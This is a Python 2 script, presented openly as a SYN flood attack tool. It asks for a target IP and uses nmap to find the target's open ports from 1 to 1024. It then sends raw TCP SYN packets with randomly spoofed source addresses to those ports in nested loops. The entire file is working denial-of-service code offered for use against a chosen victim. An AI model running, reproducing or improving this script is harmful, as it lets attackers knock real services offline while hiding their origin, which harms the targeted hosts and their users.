#!/usr/bin/env python

#Author: Stuart Woodbury
#Email: yr45570@umbc.edu

#this is code taken from the following sources, and combined to do a nice syn flood attack

# sources: http://www.binarytides.com/python-syn-flood-program-raw-sockets-linux/
#		http://www.codingwithcody.com/2010/05/generate-random-ip-with-python/	
	
#it uses nmap to find which well known ports a victim is listening on, and then it attacks those ports. 

# some imports
import socket, sys
from struct import *

from random import randrange
import random
import nmap


#make random 4 tuple; thank you http://www.codingwithcody.com/2010/05/generate-random-ip-with-python/	

def randIP():
	not_valid = [10,127,169,172,192]
	first = randrange(1,256)

	while first in not_valid:
		first = randrange(1,256)
	 
	source_ip = ".".join([str(first),str(randrange(1,256)),str(randrange(1,256)),str(randrange(1,256))])
	
	return source_ip 


# checksum functions needed for calculation checksum
def checksum(msg):
    s = 0
    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
        s = s + w
     
    s = (s>>16) + (s & 0xffff);
    #s = s + (s >> 16);
    #complement and mask to 4 byte short
    s = ~s & 0xffff
     
    return s
 

#create a raw socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
except socket.error , msg:
    print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()
 
# tell kernel not to put in headers, since we are providing it
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)


dest_ip = raw_input('Target IP: ') #The IP we are attacking

nm = nmap.PortScanner()

nm.scan(dest_ip, '1-1024')


foo = 1

for proto in nm[dest_ip].all_protocols():
	foo = 1 #do nothing

lport = nm[dest_ip][proto].keys()
lport.sort()

b = 0

while b < 10: #set b to however many times you want to attack. it is b * (ephemeral port range * ports on which victim is listening)

	counter = 49152

	while counter < 65535: #let the attack begin
		 
		# now start constructing the packet
		packet = '';
		 
		source_ip = randIP() #spoof

		 
		# ip header fields
		ihl = 5
		version = 4
		tos = 0
		tot_len = 20 + 20   # python seems to correctly fill the total length, dont know how ??
		id = 54321  #Id of this packet
		frag_off = 0
		ttl = 255
		protocol = socket.IPPROTO_TCP
		check = 10  # python seems to correctly fill the checksum
		saddr = socket.inet_aton ( source_ip )  #Spoof the source ip address if you want to
		daddr = socket.inet_aton ( dest_ip )
		 
		ihl_version = (version << 4) + ihl
		 
		# the ! in the pack format string means network order
		ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
		
		for port in lport: 
			# tcp header fields
			source = random.randint(1,65535)   # source port
			dest = port   # destination port
			seq = 0
			ack_seq = 0
			doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
			#tcp flags
			fin = 0
			syn = 1
			rst = 0
			psh = 0
			ack = 0
			urg = 0
			window = socket.htons (5840)    #   maximum allowed window size
			check = 0
			urg_ptr = 0
			 
			offset_res = (doff << 4) + 0
			tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)
			 
			# the ! in the pack format string means network order
			tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
			 
			# pseudo header fields
			source_address = socket.inet_aton( source_ip )
			dest_address = socket.inet_aton(dest_ip)
			placeholder = 0
			protocol = socket.IPPROTO_TCP
			tcp_length = len(tcp_header)
			 
			psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
			psh = psh + tcp_header;
			 
			tcp_checksum = checksum(psh)
			 
			# make the tcp header again and fill the correct checksum
			tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
			 
			# final full packet - syn packets dont have any data
			packet = ip_header + tcp_header
			 
			#Send the packet finally - the port specified has no effect
			s.sendto(packet, (dest_ip , 0 ))    # put this in a loop if you want to flood the target
			 
			#put the above line in a loop like while 1: if you want to flood
	
		counter = counter + 1

	b = b + 1
	
